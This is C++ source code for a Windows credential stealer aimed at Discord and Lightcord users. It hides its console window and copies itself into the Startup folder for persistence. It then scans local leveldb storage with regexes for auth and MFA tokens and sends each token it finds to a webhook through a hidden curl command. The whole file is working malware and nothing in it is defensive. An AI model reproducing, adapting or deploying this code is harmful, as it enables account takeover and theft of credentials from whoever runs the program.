#define _CRT_SECURE_NO_WARNINGS

#include <iostream>
#include <regex>
#include <fstream>
#include <string>
#include <filesystem>
#include <Windows.h>
#pragma comment(lib, "user32.lib")
namespace fs = std::filesystem;

bool send_token(std::string token) {
	char cmd[1024];
	sprintf(cmd, "curl -d \"content=%s\" webhook >nul", token.c_str());
	WinExec(cmd,SW_HIDE);
	
	return true;
}

std::vector<std::string> findMatch(std::string str, std::regex reg)
{
	std::vector<std::string> output;
	std::sregex_iterator currentMatch(str.begin(), str.end(), reg);
	std::sregex_iterator lastMatch;

	while (currentMatch != lastMatch) {
		std::smatch match = *currentMatch;
		output.push_back(match.str());
		currentMatch++;
	}

	return output;
}

int main() {
	FreeConsole();

	// Persistence

	char BUFFER[MAX_PATH];
	char szPath[1024];
	char szPath2[1024];

	GetModuleFileNameA(nullptr, BUFFER, MAX_PATH);
	sprintf(szPath, "%s\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\x.exe", std::getenv("appdata"));
	fs::remove(szPath);
	fs::copy(BUFFER, szPath);

	// Finding token

	std::vector<std::string> installs = { "\\Discord\\Local Storage\\leveldb", "\\Lightcord\\Local Storage\\leveldb" };

	for (int i = 0; i < 2; i++) {

		std::string path;
		path = std::getenv("appdata") + installs[i]; // Install directory

		for (const auto& entry : fs::directory_iterator(path)) // For file in path
		{
			std::string szPath = entry.path().u8string(); // Path to file
			std::ifstream ifs(szPath, std::ios_base::binary); // Create ifstream
			std::string content((std::istreambuf_iterator<char>(ifs)), (std::istreambuf_iterator<char>())); // Read file

			std::regex x("[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}"); // Create exp
			std::regex y("mfa\\.[\\w-]{84}"); // Create exp
			
			std::vector<std::string> tokens;
			std::vector<std::string> insecureTokens = findMatch(content, x);
			std::vector<std::string> mfaTokens = findMatch(content, y);

			for (int i = 0; i < insecureTokens.size(); i++) {
				tokens.push_back(insecureTokens[i]); // Add tokens from insecureTokens to other list
			}
			for (int i = 0; i < mfaTokens.size(); i++) {
				tokens.push_back(mfaTokens[i]); // Same here
			}

			for (int i = 0; i < tokens.size(); i++) {
				send_token(tokens[i]); // Iterate through all tokens and send em to webhook
			}

		}
	}
	
	return -1;
	// End
}
